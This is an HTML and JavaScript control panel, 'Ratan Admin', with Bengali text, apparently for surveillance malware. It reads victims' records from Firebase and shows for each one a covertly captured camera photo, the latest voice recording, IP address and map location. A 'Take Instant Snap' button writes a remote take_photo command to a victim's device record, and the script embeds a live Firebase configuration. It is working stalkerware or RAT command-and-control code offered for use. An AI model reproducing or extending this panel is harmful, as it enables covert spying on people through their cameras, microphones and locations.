<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Admin | Pure Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --pink: #ff4d94; --dark: #0f172a; --card: #1e293b; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
        body { background: var(--dark); color: white; display: flex; height: 100vh; overflow: hidden; }

        /* Sidebar */
        .sidebar { width: 320px; background: #020617; border-right: 2px solid var(--pink); display: flex; flex-direction: column; }
        .side-header { padding: 25px; background: var(--pink); color: white; font-weight: bold; text-align: center; font-size: 1.2rem; }
        .user-list { flex: 1; overflow-y: auto; padding: 15px; }
        .user-item { 
            background: var(--card); padding: 15px; border-radius: 12px; margin-bottom: 12px; 
            cursor: pointer; display: flex; align-items: center; gap: 12px; border: 1px solid transparent;
            transition: 0.3s;
        }
        .user-item:hover { border-color: var(--pink); transform: translateX(5px); }
        .user-item img { width: 45px; height: 45px; border-radius: 50%; border: 2px solid var(--pink); }
        .user-info-mini b { font-size: 0.9rem; display: block; }

        /* Main Display */
        .main-content { flex: 1; padding: 30px; overflow-y: auto; display: none; }
        .profile-card { max-width: 900px; margin: 0 auto; }
        .profile-head { display: flex; align-items: center; gap: 20px; margin-bottom: 30px; background: rgba(255, 77, 148, 0.1); padding: 20px; border-radius: 20px; }
        .profile-head img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid var(--pink); }

        .details-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
        .box { background: var(--card); padding: 20px; border-radius: 20px; border: 1px solid #334155; }
        .box h4 { color: var(--pink); margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
        
        .main-img { width: 100%; border-radius: 15px; border: 2px solid #334155; }
        
        .btn { display: block; width: 100%; padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-bottom: 10px; text-align: center; text-decoration: none; color: white; transition: 0.3s; }
        .btn-snap { background: #f59e0b; }
        .btn-play { background: #22c55e; }
        .btn-map { background: #3b82f6; }
        .btn-del { background: #ef4444; }
        .btn:hover { opacity: 0.8; }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="side-header"><i class="fas fa-terminal"></i> RATAN ADMIN</div>
        <div class="user-list" id="userList">
            </div>
    </div>

    <div class="main-content" id="mainContent">
        <div class="profile-card">
            <div class="profile-head">
                <img id="u_photo" src="">
                <div>
                    <h2 id="u_name">User Profile</h2>
                    <p id="u_email" style="opacity:0.6"></p>
                </div>
                <button class="btn btn-del" onclick="deleteData()" style="width:auto; margin-left:auto; padding:10px 25px;">Delete</button>
            </div>

            <div class="details-grid">
                <div class="box">
                    <h4><i class="fas fa-camera-retro"></i> Captured Photo</h4>
                    <img id="u_lastPic" src="" class="main-img">
                    <button class="btn btn-snap" onclick="sendSnapCommand()">Take Instant Snap</button>
                </div>

                <div class="box">
                    <h4><i class="fas fa-volume-up"></i> Voice Record</h4>
                    <p style="margin-bottom:15px; font-size:0.9rem;">ইউজারের লেটেস্ট ভয়েস ক্লিপ শুনতে নিচের বাটনে চাপ দিন।</p>
                    <button id="playBtn" class="btn btn-play">Play Last Voice</button>
                </div>

                <div class="box">
                    <h4><i class="fas fa-map-marker-alt"></i> Information</h4>
                    <p style="margin-bottom:8px;"><b>IP:</b> <span id="u_ip"></span></p>
                    <p style="margin-bottom:8px;"><b>Time:</b> <span id="u_time"></span></p>
                    <p style="margin-bottom:15px;"><b>Loc:</b> <span id="u_loc"></span></p>
                    <a id="u_map" href="#" target="_blank" class="btn btn-map">View on Google Maps</a>
                </div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getFirestore, collection, onSnapshot, doc, updateDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let currentUid = null;
        let currentAudio = null;

        // অটোমেটিক ইউজার লিস্ট লোড করা (নো লগইন)
        onSnapshot(collection(db, "users"), (snap) => {
            const list = document.getElementById('userList');
            list.innerHTML = '';
            snap.forEach(d => {
                const u = d.data();
                const div = document.createElement('div');
                div.className = 'user-item';
                div.onclick = () => showUser(d.id, u);
                div.innerHTML = `
                    <img src="${u.photo}">
                    <div class="user-info-mini">
                        <b>${u.name}</b>
                        <span style="font-size:10px; opacity:0.6">${u.email}</span>
                    </div>
                `;
                list.appendChild(div);
            });
        });

        function showUser(id, u) {
            currentUid = id;
            currentAudio = u.lastAudio;
            document.getElementById('mainContent').style.display = 'block';
            document.getElementById('u_name').innerText = u.name;
            document.getElementById('u_email').innerText = u.email;
            document.getElementById('u_photo').src = u.photo;
            document.getElementById('u_lastPic').src = u.lastPic || 'https://via.placeholder.com/300?text=Wait+for+Photo';
            document.getElementById('u_ip').innerText = u.ip || 'Unknown';
            document.getElementById('u_time').innerText = u.time || 'N/A';
            document.getElementById('u_loc').innerText = u.loc || 'N/A';
            document.getElementById('u_map').href = `https://www.google.com/maps?q=${u.loc}`;

            document.getElementById('playBtn').onclick = () => {
                if(currentAudio) {
                    const audio = new Audio(currentAudio);
                    audio.play();
                } else {
                    alert("ইউজার এখনো কোনো অডিও পাঠায়নি!");
                }
            };
        }

        window.sendSnapCommand = async () => {
            if(!currentUid) return;
            await updateDoc(doc(db, "users", currentUid), { command: "take_photo" });
            alert("ছবি তোলার কমান্ড পাঠানো হয়েছে!");
        };

        window.deleteData = async () => {
            if(!currentUid) return;
            if(confirm("সব ডাটা ডিলিট করবেন?")) {
                await deleteDoc(doc(db, "users", currentUid));
                document.getElementById('mainContent').style.display = 'none';
            }
        };
    </script>
</body>
</html>
